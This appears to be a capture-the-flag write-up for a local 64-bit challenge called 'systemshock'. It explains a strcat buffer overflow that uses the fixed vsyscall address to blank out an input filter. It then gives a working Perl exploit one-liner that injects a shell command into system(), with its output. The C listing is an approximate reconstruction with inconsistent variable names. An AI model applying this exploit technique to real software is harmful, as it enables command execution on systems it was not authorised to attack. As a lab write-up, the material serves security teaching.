# systemshock - Pwn 200 problem

systemshock was a local 64 bit pwnable with stack canaries. The code looked
something like this (with the stack canary code omitted):

```c
int main(int argc, char **argv) {
  int i;
  char buf[256] = "id ";
  zero_environment();

  if (argv[1]) {
    strcat(dest, argv[1])
    for (i = 0; i < strlen(argv[1]) + 3; ++i) {
      if (!isalnum(dest[i]) && dest[i] != ' ') {
        return 1;
      }
    }
    return system(buf);
  }

  return 0;
}
```

There is a an obvious buffer overflow on the `strcat` call. Normally, we'd like
to inject additional shell commands in `buf`, but the validation loop checks
that all characters are alphanumeric or space. However, we can use the `strcat`
to overwrite `argv[1]` with an empty string.  I used a null byte in the
vsyscall page, since the vsyscall page is always loaded at the same address,
and the vsyscall page has addresses that contain no zeros (since otherwise the
`strcat` would terminate).

Now that we've disabled the validation loop into terminating, we can do shell injection cat the flag:

```
$ ./shock "$(perl -e '$x = ";cat flag;#";print $x,"A"x(0x128+0xe8-3-length($x)),pack("Q",0xffffffffff600404)')"
B9sdeage OVvn23oSx0ds9^^to NVxqjy is_extremely Hosx093t
Segmentation fault
```
